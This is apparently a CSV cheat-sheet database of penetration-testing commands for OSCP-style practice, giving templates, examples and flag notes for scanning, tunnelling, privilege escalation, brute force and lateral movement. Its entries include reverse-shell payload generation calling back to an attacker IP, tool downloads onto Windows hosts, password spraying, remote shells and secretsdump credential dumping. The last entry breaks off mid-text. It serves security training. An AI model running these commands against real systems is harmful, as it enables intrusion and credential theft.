"proxychains-psql","PostgreSQL Through Proxychains","pivoting","proxychains -q psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>","Connect to internal PostgreSQL database through SOCKS proxy using proxychains","proxychains","proxychains -q psql -h 172.16.50.217 -p 5432 -U postgres -d confluence","Common OSCP scenario:
Find PostgreSQL credentials in config files (e.g., confluence.cfg.xml), access internal database through pivot.

Alternative to port forwarding when you want interactive session without permanent tunnel.

For non-interactive queries, use:
echo 'SELECT * FROM users;' | proxychains psql -h <TARGET> -U <USER> -d <DB>.

Time estimate:
1-2 minutes for connection and query.","medium","","","","{""Connection timeout"": ""Verify PostgreSQL reachable: proxychains nc -zv <TARGET> 5432, check SOCKS proxy running"", ""Authentication failed"": ""Verify credentials, try default: postgres:postgres, admin:admin, check case sensitivity"", ""Socket error"": ""Check proxychains config: cat /etc/proxychains4.conf | grep socks5, verify SOCKS port matches SSH tunnel"", ""psql hangs at password prompt"": ""Add password to PGPASSWORD env var: PGPASSWORD=<pass> proxychains psql -h <TARGET> -U <USER> -d <DB>""}","{""-q"": ""Proxychains quiet mode - suppress proxy output for clean psql session"", ""-h"": ""PostgreSQL host IP address"", ""-p"": ""PostgreSQL port (default 5432 if omitted)"", ""-U"": ""Username for database authentication"", ""-d"": ""Database name to connect to""}","","",""
"rustscan-fast-scan","Rustscan - Fast Port Scanner","recon","rustscan -a <TARGET> -- -sV -sC","Ultra-fast SYN scanner that feeds open ports to nmap","port-scanning","rustscan -a 192.168.1.1 -- -sV -sC","","","","","","","{""-a"": ""Target address"", ""--"": ""Pass flags to nmap"", ""-sV"": ""Service version detection (nmap)"", ""-sC"": ""Default scripts (nmap)""}","","[""nmap-quick-scan"", ""masscan-fast-scan""]",""
"masscan-fast-scan","Masscan - Fast Network Scanner","recon","masscan -p1-65535 <TARGET> --rate=1000","Fastest internet-scale port scanner","port-scanning","masscan -p1-65535 192.168.1.0/24 --rate=1000","","","","","","","{""-p"": ""Port range to scan"", ""--rate"": ""Packets per second""}","","","[""nmap-service-scan""]"
"autorecon-full","AutoRecon - Automated Enumeration","recon","autorecon <TARGET> -o <OUTPUT_DIR>","Multi-threaded network reconnaissance tool that automates enumeration","automated","autorecon 192.168.1.1 -o ./autorecon-results","","","","","","","{""-o"": ""Output directory"", ""-v"": ""Verbose output""}","","",""
"enum4linux-smb","Enum4Linux - SMB Enumeration","recon","enum4linux -a <TARGET>","Tool for enumerating information from Windows and Samba systems","smb","enum4linux -a 192.168.1.1","","","","","","","{""-a"": ""Do all simple enumeration"", ""-U"": ""Get userlist"", ""-S"": ""Get sharelist"", ""-G"": ""Get group and member list""}","","[""enum4linux-ng""]",""
"enum4linux-ng","Enum4Linux-ng - Modern SMB Enumeration","recon","enum4linux-ng -A <TARGET>","Next generation enum4linux with more features and better output","smb","enum4linux-ng -A 192.168.1.1","","","","","","","{""-A"": ""Do all enumeration"", ""-C"": ""Get RPC info"", ""-U"": ""Get users"", ""-S"": ""Get shares""}","","[""enum4linux-smb""]",""
"whatweb-scan","WhatWeb - Web Technology Scanner","recon","whatweb -v <URL>","Identifies websites technologies, CMS, plugins, versions","web","whatweb -v http://target.com","","","","","","","{""-v"": ""Verbose output"", ""-a"": ""Aggression level (1-4)""}","","",""
"ldapsearch-basic","LDAP Search - Basic Enumeration","recon","ldapsearch -x -H ldap://<TARGET> -b '<BASE_DN>'","Query LDAP directory for users and objects","ldap","ldapsearch -x -H ldap://192.168.1.1 -b 'DC=domain,DC=local'","","","","","","","{""-x"": ""Simple authentication"", ""-H"": ""LDAP URI"", ""-b"": ""Base DN for search""}","","",""
"ldapsearch-dump","LDAP Search - Full Dump","recon","ldapsearch -x -H ldap://<TARGET> -b '<BASE_DN>' -D '<USER>' -w '<PASS>' '*'","Dump all LDAP directory information","ldap","ldapsearch -x -H ldap://192.168.1.1 -b 'DC=domain,DC=local' -D 'admin' -w 'P@ssw0rd123!' '*'","","","","","","","{""-D"": ""Bind DN (user)"", ""-w"": ""Password"", ""'*'"": ""All attributes""}","","",""
"dig-domain-enum","Dig - Domain Enumeration","recon","dig <DOMAIN> ANY","DNS lookup utility for domain reconnaissance","dns","dig example.com ANY","","","","","","","","","",""
"dig-zone-transfer","Dig - DNS Zone Transfer","recon","dig axfr @<NAMESERVER> <DOMAIN>","Attempt AXFR zone transfer to dump all DNS records","dns","dig axfr @192.168.1.1 example.com","","","","","","","{""axfr"": ""Zone transfer request"", ""@"": ""Specify nameserver""}","","",""
"dnsenum-domain","DNSenum - Domain Enumeration","recon","dnsenum <DOMAIN>","Comprehensive DNS enumeration tool","dns","dnsenum example.com","","","","","","","","","",""
"dnsrecon-domain","DNSRecon - DNS Reconnaissance","recon","dnsrecon -d <DOMAIN> -t std","DNS enumeration and network mapping","dns","dnsrecon -d example.com -t std","","","","","","","{""-d"": ""Domain to target"", ""-t"": ""Type of enumeration (std, axfr, bing, etc.)""}","","[""dnsenum-domain"", ""dig-zone-transfer""]",""
"suid-find","SUID - Find Binaries","privilege-escalation","find / -perm -u=s -type f 2>/dev/null","Find SUID/SGID binaries for privilege escalation","linux","","","","","","","","{""-perm -u=s"": ""Find SUID bit set"", ""-type f"": ""Files only"", ""2>/dev/null"": ""Suppress errors""}","","",""
"suid-exploit","SUID - Exploit Binary","privilege-escalation","<SUID_BINARY>","Exploit SUID binary for privilege escalation","linux","/usr/bin/find","","","","","","","","","",""
"cap-find","Capabilities - Find Binaries","privilege-escalation","getcap -r / 2>/dev/null","Find binaries with Linux capabilities","linux","","","","","","","","{""-r"": ""Recursive search"", ""2>/dev/null"": ""Suppress errors""}","","",""
"cap-exploit","Capabilities - Exploit Binary","privilege-escalation","<CAP_BINARY>","Exploit capability-enabled binary for privesc","linux","/usr/bin/python3.8","","","","","","","","","",""
"cron-enum","Cronjobs - Enumerate","privilege-escalation","cat /etc/crontab","Find scheduled cronjobs for privilege escalation","linux","","","","","","","","","","",""
"kernel-exploit-search","Kernel Exploit - Search","privilege-escalation","uname -a","Search for kernel exploits","linux","","","","","","","","{""-a"": ""All system information""}","","",""
"gtfobins-lookup","GTFOBins - Lookup","privilege-escalation","# Visit https://gtfobins.github.io/","Lookup binary exploitation on GTFOBins","linux","","","","","","","","","","",""
"lolbas-lookup","LOLBAS - Lookup","privilege-escalation","# Visit https://lolbas-project.github.io/","Lookup Windows binary exploitation on LOLBAS","windows","","","","","","","","","","",""
"ffuf-dir-fuzz","Ffuf - Directory Fuzzing","web","ffuf -u http://<TARGET>/FUZZ -w <WORDLIST>","Fast web fuzzer for directory discovery","fuzzing","ffuf -u http://192.168.1.1/FUZZ -w /usr/share/wordlists/dirb/common.txt","","","","","","","{""-u"": ""Target URL (FUZZ keyword for injection point)"", ""-w"": ""Wordlist file"", ""-fc"": ""Filter HTTP status codes"", ""-fs"": ""Filter response size""}","","[""gobuster-dir-basic"", ""wfuzz-dir""]",""
"ffuf-vhost-fuzz","Ffuf - Virtual Host Discovery","web","ffuf -u http://<TARGET> -H 'Host: FUZZ.<DOMAIN>' -w <WORDLIST>","Fuzz for virtual hosts on a target","fuzzing","ffuf -u http://192.168.1.1 -H 'Host: FUZZ.example.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt","","","","","","","{""-H"": ""Custom header (Host header here)"", ""-fs"": ""Filter by response size""}","","",""
"ffuf-param-fuzz","Ffuf - Parameter Fuzzing","web","ffuf -u 'http://<TARGET>/<PATH>?FUZZ=test' -w <WORDLIST>","Discover hidden GET/POST parameters","fuzzing","ffuf -u 'http://target.com/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt","","","","","","","{""-X"": ""HTTP method (POST for POST params)"", ""-d"": ""POST data (use with -X POST)""}","","",""
"curl-get","Curl - HTTP GET Request","web","curl <URL>","Make HTTP GET request to URL","http-client","curl http://target.com","","","","","","","{""-v"": ""Verbose output"", ""-i"": ""Include response headers"", ""-L"": ""Follow redirects""}","","",""
"curl-headers","Curl - View HTTP Headers","web","curl -I <URL>","Display only HTTP response headers","http-client","curl -I http://target.com","","","","","","","{""-I"": ""Fetch headers only (HEAD request)""}","","",""
"gobuster-dir-basic","Gobuster - Directory Enumeration","web","gobuster dir -u http://<TARGET> -w <WORDLIST>","Fast directory/file brute-forcing tool","directory-enumeration","gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt","","","","","","","{""dir"": ""Directory/file enumeration mode"", ""-u"": ""Target URL"", ""-w"": ""Wordlist"", ""-x"": ""File extensions to search (php,txt,html)"", ""-t"": ""Number of threads (default 10)""}","","[""ffuf-dir-fuzz"", ""wfuzz-dir""]",""
"wfuzz-dir","Wfuzz - Directory Fuzzing","web","wfuzz -w <WORDLIST> --hc 404 http://<TARGET>/FUZZ","Web application fuzzer for directories","fuzzing","wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.1.1/FUZZ","","","","","","","{""-w"": ""Wordlist"", ""--hc"": ""Hide HTTP status codes"", ""--hl"": ""Hide by line count"", ""--hw"": ""Hide by word count""}","","[""gobuster-dir-basic"", ""ffuf-dir-fuzz""]",""
"wfuzz-param","Wfuzz - Parameter Fuzzing","web","wfuzz -w <WORDLIST> --hh 0 http://<TARGET>/?FUZZ=test","Fuzz for hidden parameters","fuzzing","wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0 http://target.com/index.php/?FUZZ=test","","","","","","","","","",""
"nikto-web-scan","Nikto - Web Vulnerability Scanner","web","nikto -h http://<TARGET>","Scan web server for vulnerabilities","vulnerability-scanning","nikto -h http://192.168.1.1","","","","","","","{""-h"": ""Target host"", ""-p"": ""Port (default 80)"", ""-ssl"": ""Force SSL mode"", ""-o"": ""Output file""}","","",""
"wpscan-enumerate","WPScan - WordPress Scanner","web","wpscan --url http://<TARGET> --enumerate u,p,t","Enumerate WordPress installation","cms-enumeration","wpscan --url http://target.com --enumerate u,p,t","","","","","","","{""--url"": ""Target WordPress site"", ""--enumerate"": ""Enumerate users(u), plugins(p), themes(t)"", ""--api-token"": ""WPVulnDB API token for vulnerability data""}","","",""
"joomscan-enumerate","Joomscan - Joomla Scanner","web","joomscan -u http://<TARGET>","Enumerate Joomla installation","cms-enumeration","joomscan -u http://target.com","","","","","","","{""-u"": ""Target URL"", ""-ec"": ""Enumerate components""}","","",""
"droopescan-enumerate","Droopescan - CMS Scanner","web","droopescan scan <CMS> -u http://<TARGET>","Scanner for Drupal, Joomla, Wordpress, Silverstripe","cms-enumeration","droopescan scan drupal -u http://target.com","","","","","","","{""scan"": ""CMS to scan"", ""-u"": ""Target URL"", ""-t"": ""Number of threads""}","","",""
"wget-recursive","Wget - Recursive Download","web","wget -r -np -nH --cut-dirs=1 http://<TARGET>/","Recursively download website","web-scraping","wget -r -np -nH --cut-dirs=1 http://target.com/","","","","","","","{""-r"": ""Recursive download"", ""-np"": ""No parent (don't ascend to parent directory)"", ""-nH"": ""No host directories"", ""--cut-dirs"": ""Ignore N directory levels""}","","",""
"sqlmap-advanced","SQLMap - SQL Injection Testing","web","sqlmap -u '<URL>' -p <PARAM> --batch","Automated SQL injection detection and exploitation","sql-injection","sqlmap -u 'http://target.com/index.php?id=1' -p id --batch","","","","","","","{""-u"": ""Target URL"", ""-p"": ""Testable parameter"", ""--batch"": ""Non-interactive mode"", ""--dbs"": ""Enumerate databases"", ""--dump"": ""Dump table data""}","","",""
"php-http-server","PHP - Simple HTTP Server","file-transfer","php -S 0.0.0.0:<PORT>","Start simple HTTP server using PHP","http-server","php -S 0.0.0.0:8000","","","","","","","{""-S"": ""Run built-in web server""}","","[""ruby-http-server""]",""
"ruby-http-server","Ruby - Simple HTTP Server","file-transfer","ruby -run -ehttpd . -p<PORT>","Start simple HTTP server using Ruby","http-server","ruby -run -ehttpd . -p8000","","","","","","","","","[""php-http-server""]",""
"scp-upload","SCP - Upload File","file-transfer","scp <LOCAL_FILE> <USER>@<TARGET>:<REMOTE_PATH>","Upload file to remote host via SCP","scp","scp exploit.sh user@192.168.1.1:/tmp/exploit.sh","","","","","","","{""-P"": ""Specify SSH port (uppercase P)"", ""-r"": ""Recursive (for directories)""}","","",""
"scp-download","SCP - Download File","file-transfer","scp <USER>@<TARGET>:<REMOTE_FILE> <LOCAL_PATH>","Download file from remote host via SCP","scp","scp user@192.168.1.1:/etc/passwd ./passwd","","","","","","","","","",""
"tftp-upload","TFTP - Upload File","file-transfer","tftp -i <TARGET> PUT <LOCAL_FILE>","Upload file via TFTP (common on Windows)","tftp","tftp -i 10.10.14.1 PUT data.txt","","","","","","","{""-i"": ""Binary mode (Windows)"", ""PUT"": ""Upload file"", ""GET"": ""Download file""}","","",""
"impacket-smbserver","Impacket SMB Server","file-transfer","impacket-smbserver <SHARE_NAME> <DIRECTORY> -smb2support","Start temporary SMB server for file transfer","smb","impacket-smbserver share . -smb2support","","","","","","","{""-smb2support"": ""Enable SMB2 support"", ""-username"": ""Require authentication"", ""-password"": ""Set password""}","","",""
"bitsadmin-download","Bitsadmin - Download File","file-transfer","bitsadmin /transfer myDownload /download /priority high http://<LHOST>/<FILE> <DEST>","Download file on Windows using bitsadmin","windows","bitsadmin /transfer myDownload /download /priority high http://10.10.14.1/nc.exe C:\Temp\nc.exe","","","","","","","{""/transfer"": ""Transfer job name"", ""/download"": ""Download mode"", ""/priority"": ""Priority level""}","","",""
"powershell-wget","PowerShell - Download File (wget)","file-transfer","powershell wget http://<LHOST>/<FILE> -OutFile <DEST>","Download file using PowerShell wget alias","windows","powershell wget http://10.10.14.1/nc.exe -OutFile C:\Temp\nc.exe","","","","","","","","","[""powershell-invoke-webrequest""]",""
"powershell-invoke-webrequest","PowerShell - Invoke-WebRequest","file-transfer","powershell -c ""Invoke-WebRequest -Uri 'http://<LHOST>/<FILE>' -OutFile '<DEST>'""","Download file using PowerShell Invoke-WebRequest","windows","powershell -c ""Invoke-WebRequest -Uri 'http://10.10.14.1/nc.exe' -OutFile 'C:\Temp\nc.exe'""","","","","","","","{""-Uri"": ""URL to download"", ""-OutFile"": ""Output file path""}","","",""
"chisel-server","Chisel - Server Mode","tunneling","chisel server -p <PORT> --reverse","Start Chisel server for reverse tunneling","port-forwarding","chisel server -p 8000 --reverse","","","","","","","{""-p"": ""Server listening port"", ""--reverse"": ""Enable reverse tunneling"", ""--socks5"": ""Enable SOCKS5 proxy""}","","[""ssh-dynamic-port-forward"", ""ligolo-server""]","[""chisel-client"", ""chisel-socks""]"
"chisel-client","Chisel - Client Mode","tunneling","chisel client <SERVER_IP>:<PORT> R:<LPORT>:<TARGET>:<RPORT>","Connect Chisel client for tunneling","port-forwarding","chisel client 10.10.14.1:8000 R:9090:172.16.1.10:80","","","","","","","","[""chisel-server""]","[""ssh-local-forward"", ""plink-remote-forward"", ""ligolo-agent""]","[""proxychains-nmap"", ""nmap-service-scan""]"
"chisel-socks","Chisel - SOCKS Proxy","tunneling","chisel client <SERVER_IP>:<PORT> R:socks","Create SOCKS proxy through Chisel","socks-proxy","chisel client 10.10.14.1:8000 R:socks","","","","","","","","[""chisel-server""]","[""ssh-dynamic-forward"", ""sshuttle-vpn""]","[""proxychains-config"", ""proxychains-nmap""]"
"ssh-local-forward","SSH - Local Port Forwarding","tunneling","ssh -L <LPORT>:<TARGET>:<RPORT> <USER>@<SSH_HOST>","Forward local port through SSH tunnel","ssh-tunneling","ssh -L 8080:172.16.1.10:80 user@192.168.1.1","","","","","","","{""-L"": ""Local port forwarding"", ""-N"": ""No command execution (tunnel only)"", ""-f"": ""Background process""}","[""ssh-connect""]","[""chisel-client"", ""ssh-local-port-forward"", ""plink-remote-forward""]","[""proxychains-nmap"", ""nmap-service-scan""]"
"ssh-remote-forward","SSH - Remote Port Forwarding","tunneling","ssh -R <RPORT>:localhost:<LPORT> <USER>@<SSH_HOST>","Forward remote port back to attacker","ssh-tunneling","ssh -R 8080:localhost:80 user@192.168.1.1","","","","","","","{""-R"": ""Remote port forwarding"", ""-N"": ""No command execution""}","[""ssh-connect""]","[""chisel-client"", ""plink-remote-forward"", ""ssh-remote-port-forward""]","[""nmap-service-scan"", ""nc-listener-setup""]"
"ssh-dynamic-forward","SSH - Dynamic Port Forwarding (SOCKS)","tunneling","ssh -D <LPORT> <USER>@<SSH_HOST>","Create SOCKS proxy through SSH","ssh-tunneling","ssh -D 1080 user@192.168.1.1","","","","","","","{""-D"": ""Dynamic port forwarding (SOCKS)"", ""-N"": ""No command execution"", ""-f"": ""Background process""}","[""ssh-connect""]","[""chisel-socks"", ""sshuttle-vpn"", ""ssh-dynamic-port-forward""]","[""proxychains-config"", ""proxychains-nmap""]"
"ligolo-server","Ligolo-ng - Server","tunneling","ligolo-ng -selfcert","Start Ligolo-ng server for pivoting","pivoting","","","","","","","","","","[""chisel-server"", ""ssh-dynamic-port-forward""]","[""ligolo-agent""]"
"ligolo-agent","Ligolo-ng - Agent","tunneling","ligolo-agent -connect <SERVER_IP>:11601 -ignore-cert","Connect Ligolo-ng agent to server","pivoting","ligolo-agent -connect 10.10.14.1:11601 -ignore-cert","","","","","","","","[""ligolo-server""]","[""chisel-client"", ""ssh-dynamic-forward""]","[""nmap-service-scan"", ""bloodhound-ingest""]"
"msfvenom-linux-shell","Msfvenom - Linux Reverse Shell","exploitation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf","Generate Linux x64 reverse shell payload","payload-generation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o shell.elf","","","","","","","{""-p"": ""Payload to generate"", ""LHOST"": ""Local host (attacker IP)"", ""LPORT"": ""Local port (listening port)"", ""-f"": ""Output format (elf, exe, raw, etc.)"", ""-o"": ""Output file""}","","",""
"msfvenom-windows-shell","Msfvenom - Windows Reverse Shell","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe","Generate Windows x64 reverse shell executable","payload-generation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe","","","","","","","{""-p"": ""Payload to generate"", ""-f"": ""Output format (exe)"", ""-o"": ""Output file""}","","",""
"msfvenom-staged","Msfvenom - Staged Payload","exploitation","msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o staged.elf","Generate staged payload for constrained environments","payload-generation","msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o staged.elf","","","","","","","{""-p"": ""Staged payload (note the / instead of _)"", ""-e"": ""Encoder (x86/shikata_ga_nai)"", ""-i"": ""Encoding iterations""}","","",""
"searchsploit-search","Searchsploit - Search Exploits","exploitation","searchsploit <SEARCH_TERM>","Search exploit-db for vulnerabilities","exploit-research","searchsploit apache 2.4","","","","","","","{""-t"": ""Search exploit title"", ""-w"": ""Show URLs"", ""-x"": ""Examine exploit (searchsploit -x <EDB-ID>)"", ""-m"": ""Mirror exploit to current directory""}","","",""
"searchsploit-update","Searchsploit - Update Database","exploitation","searchsploit -u","Update local exploit-db repository","exploit-research","","","","","","","","{""-u"": ""Update exploit-db from GitHub""}","","",""
"nc-bind-shell","Netcat - Bind Shell","exploitation","nc <TARGET> <RPORT>","Connect to bind shell on target","shells","nc 192.168.1.1 4444","","","","","","","","","",""
"socat-listener","Socat - Enhanced Listener","exploitation","socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>","Start socat listener with PTY support","listeners","socat file:`tty`,raw,echo=0 tcp-listen:4444","","","","","","","{""file:`tty`,raw,echo=0"": ""PTY allocation for better shell"", ""tcp-listen"": ""TCP listener""}","","[""nc-listener""]",""
"socat-file-transfer","Socat - File Transfer","exploitation","socat TCP4-LISTEN:<LPORT>,fork file:<FILENAME>","Transfer files using socat","file-transfer","socat TCP4-LISTEN:8000,fork file:exploit.sh","","","","","","","","","",""
"msfconsole-search","Metasploit - Search Modules","exploitation","msfconsole -q -x 'search <SEARCH_TERM>; exit'","Search for exploit modules in Metasploit","metasploit","msfconsole -q -x 'search apache; exit'","","","","","","","{""-q"": ""Quiet mode (no banner)"", ""-x"": ""Execute command and exit""}","","",""
"msfconsole-exploit","Metasploit - Run Exploit","exploitation","msfconsole -q -x 'use <MODULE>; set RHOSTS <TARGET>; set LHOST <LHOST>; run'","Execute exploit module with handler","metasploit","msfconsole -q -x 'use exploit/multi/handler; set RHOSTS 192.168.1.1; set LHOST 10.10.14.1; run'","","","","","","","","","",""
"linpeas-run","LinPEAS - Linux Privilege Escalation","post-exploitation","./linpeas.sh","Automated Linux privilege escalation enumeration","enumeration-linux","","","","","","","","","","",""
"linenum-run","LinEnum - Linux Enumeration","post-exploitation","./LinEnum.sh -t","Linux enumeration script for privilege escalation","enumeration-linux","","","","","","","","{""-t"": ""Thorough tests (longer runtime)"", ""-k"": ""Kernel exploits"", ""-r"": ""Report name""}","","",""
"les-run","Linux Exploit Suggester","post-exploitation","./linux-exploit-suggester.sh","Suggest kernel exploits for privilege escalation","enumeration-linux","","","","","","","","","","",""
"pspy-monitor","Pspy - Process Monitor","post-exploitation","./pspy64","Monitor Linux processes without root (detect cronjobs)","enumeration-linux","","","","","","","","","","",""
"winpeas-run","WinPEAS - Windows Privilege Escalation","post-exploitation","winpeas.exe","Automated Windows privilege escalation enumeration","enumeration-windows","","","","","","","","","","",""
"wes-run","Windows Exploit Suggester","post-exploitation","python windows-exploit-suggester.py --database <DB> --systeminfo <FILE>","Suggest Windows exploits based on systeminfo","enumeration-windows","python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt","","","","","","","{""--update"": ""Update exploit database"", ""--database"": ""Path to database file"", ""--systeminfo"": ""systeminfo output file""}","","",""
"powerup-run","PowerUp - Windows Privesc Check","post-exploitation","powershell -ep bypass -c '. .\PowerUp.ps1; Invoke-AllChecks'","PowerShell script for Windows privilege escalation checks","enumeration-windows","","","","","","","","{""-ep bypass"": ""Bypass execution policy"", ""-c"": ""Command to execute""}","","",""
"privesccheck-run","PrivescCheck - Windows Enumeration","post-exploitation","powershell -ep bypass -c '. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended'","Comprehensive Windows privilege escalation checks","enumeration-windows","","","","","","","","{""-Extended"": ""Extended checks (slower)"", ""-Report"": ""Output format (HTML, CSV, TXT)""}","","",""
"seatbelt-run","Seatbelt - Windows Host Survey","post-exploitation","Seatbelt.exe -group=all","C# tool for Windows security posture assessment","enumeration-windows","","","","","","","","{""-group=all"": ""Run all checks"", ""-group=system"": ""System checks only"", ""-group=user"": ""User checks only""}","","",""
"sharphound-collect","SharpHound - AD Data Collection","post-exploitation","SharpHound.exe -c All","Collect Active Directory data for BloodHound analysis","active-directory","","","","","","","","{""-c"": ""Collection method (All, DCOnly, ComputerOnly)"", ""--domain"": ""Target domain"", ""--zipfilename"": ""Output file name""}","","",""
"bloodhound-analyze","BloodHound - AD Path Analysis","post-exploitation","neo4j console","Analyze Active Directory attack paths","active-directory","","","","","","","","","[""import-sharphound""]","",""
"hydra-ftp","Hydra - FTP Brute Force","password-attacks","hydra -L <USERLIST> -P <PASSLIST> ftp://<TARGET>","Brute force FTP credentials","brute-force","hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1","","","","","","","{""-L"": ""Username list"", ""-P"": ""Password list"", ""-t"": ""Parallel tasks (default 16)"", ""-V"": ""Verbose (show attempts)""}","","",""
"hydra-http","Hydra - HTTP POST Brute Force","password-attacks","hydra -l <USER> -P <PASSLIST> <TARGET> http-post-form '<PATH>:<PARAMS>:<FAIL_STRING>'","Brute force HTTP login forms","brute-force","hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/login.php:user=^USER^&pass=^PASS^:Login failed'","","","","","","","{""-l"": ""Single username"", ""-L"": ""Username list"", ""http-post-form"": ""HTTP POST form module""}","","",""
"medusa-ssh","Medusa - SSH Brute Force","password-attacks","medusa -h <TARGET> -U <USERLIST> -P <PASSLIST> -M ssh","Brute force SSH credentials","brute-force","medusa -h 192.168.1.1 -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -M ssh","","","","","","","{""-h"": ""Target host"", ""-U"": ""Username file"", ""-P"": ""Password file"", ""-M"": ""Module to use (ssh, ftp, etc.)""}","","",""
"medusa-smb","Medusa - SMB Brute Force","password-attacks","medusa -h <TARGET> -U <USERLIST> -P <PASSLIST> -M smbnt","Brute force SMB credentials","brute-force","medusa -h 192.168.1.1 -U users.txt -P /usr/share/wordlists/rockyou.txt -M smbnt","","","","","","","","","",""
"cme-smb","CrackMapExec - SMB Brute Force","password-attacks","crackmapexec smb <TARGET> -u <USER> -p <PASS>","Brute force and spray SMB credentials","credential-spraying","crackmapexec smb 192.168.1.0/24 -u admin -p Password123","","","","","","","{""-u"": ""Username (or file with -U)"", ""-p"": ""Password (or file with -P)"", ""--shares"": ""Enumerate shares"", ""--local-auth"": ""Local authentication""}","","",""
"cme-winrm","CrackMapExec - WinRM Brute Force","password-attacks","crackmapexec winrm <TARGET> -u <USER> -p <PASS>","Brute force WinRM credentials","credential-spraying","crackmapexec winrm 192.168.1.1 -u administrator -p Password123","","","","","","","","","",""
"cme-ssh","CrackMapExec - SSH Brute Force","password-attacks","crackmapexec ssh <TARGET> -u <USER> -p <PASS>","Brute force SSH credentials","credential-spraying","crackmapexec ssh 192.168.1.1 -u root -p toor","","","","","","","","","",""
"john-crack","John - Crack Password Hashes","password-attacks","john --wordlist=<WORDLIST> <HASHFILE>","Crack password hashes with John the Ripper","hash-cracking","john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt","","","","","","","{""--wordlist"": ""Wordlist for cracking"", ""--format"": ""Hash format (md5, sha256, etc.)"", ""--show"": ""Show cracked passwords""}","","",""
"john-format","John - Format Hash File","password-attacks","<TOOL>2john <FILE> > <HASHFILE>","Convert hash to John format","hash-cracking","ssh2john id_rsa > hash.txt","","","","","","","","","",""
"hashcat-crack","Hashcat - Crack Hashes","password-attacks","hashcat -m <MODE> -a 0 <HASHFILE> <WORDLIST>","GPU-accelerated hash cracking","hash-cracking","hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt","","","","","","","{""-m"": ""Hash type mode"", ""-a"": ""Attack mode (0=wordlist, 3=brute-force)"", ""-r"": ""Rules file"", ""--show"": ""Show cracked hashes""}","","",""
"hashcat-modes","Hashcat - List Hash Modes","password-attacks","hashcat --help | grep -i <HASH_TYPE>","Display supported hash types","hash-cracking","hashcat --help | grep -i ntlm","","","","","","","","","",""
"hashid-identify","Hashid - Identify Hash Type","password-attacks","hashid <HASH>","Identify hash type for cracking","hash-identification","hashid 5f4dcc3b5aa765d61d8327deb882cf99","","","","","","","{""-m"": ""Show Hashcat modes"", ""-j"": ""Show John formats""}","","[""hash-identifier""]",""
"hash-identifier-run","Hash Identifier - Interactive","password-attacks","hash-identifier","Interactive hash type identification","hash-identification","","","","","","","","","","",""
"kerbrute-userenum","Kerbrute - User Enumeration","password-attacks","kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>","Enumerate valid Active Directory users via Kerberos","active-directory","kerbrute userenum -d domain.local --dc 192.168.1.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt","","","","","","","{""-d"": ""Domain name"", ""--dc"": ""Domain controller IP"", ""-o"": ""Output file""}","","",""
"kerbrute-bruteuser","Kerbrute - Password Spray","password-attacks","kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> <PASSWORD>","Password spray against Active Directory users","active-directory","kerbrute passwordspray -d domain.local --dc 192.168.1.10 users.txt Password123","","","","","","","","","",""
"bloodhound-ingest","BloodHound - Ingest Data","active-directory","# Import via BloodHound GUI: Upload Data button","Import SharpHound data to BloodHound","enumeration","","","","","","","","","","",""
"bloodhound-query","BloodHound - Query Paths","active-directory","# Run query: 'Shortest Paths to Domain Admins'","Query attack paths in BloodHound","enumeration","","","","","","","","","","",""
"cme-smb-users","CrackMapExec - Enumerate Users","active-directory","crackmapexec smb <TARGET> -u <USER> -p <PASS> --users","Enumerate domain users via SMB","enumeration","crackmapexec smb 192.168.1.10 -u user -p Password123 --users","","","","","","","{""--users"": ""Enumerate domain users"", ""--groups"": ""Enumerate domain groups""}","","",""
"psexec-shell","Impacket PSExec - Remote Shell","active-directory","impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Execute commands remotely via PSExec","lateral-movement","impacket-psexec domain.local/administrator:Password123@192.168.1.10","","","","","","","","","",""
"smbexec-shell","Impacket SMBExec - Remote Shell","active-directory","impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Execute commands via SMB (fileless)","lateral-movement","impacket-smbexec domain.local/administrator:Password123@192.168.1.10","","","","","","","","","[""psexec-shell"", ""wmiexec-shell""]",""
"wmiexec-shell","Impacket WMIExec - Remote Shell","active-directory","impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Execute commands via WMI (semi-interactive)","lateral-movement","impacket-wmiexec domain.local/administrator:Password123@192.168.1.10","","","","","","","","","",""
"secretsdump-hashes","Impacket SecretsDump - DCSync and Credential Dumping","active-directory","impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<TARGET>'","Comprehensive credential dumping tool supporting DCSync (DRSUAPI replication), SAM/LSA dumping, and NTDS.dit extraction. Primary method for domain credential harvesting from Kali Linux.","credential-dumping","impacket-secretsdump '<corp.com>/<administrator>:<Password123!>@<192.168.50.70>'","OSCP METHODOLOGY - COMPREHENSIVE CREDENTIAL DUMPING WITH SECRETSDUMP:
impacket-secretsdump is the SWISS ARMY KNIFE of credential dumping from Linux.

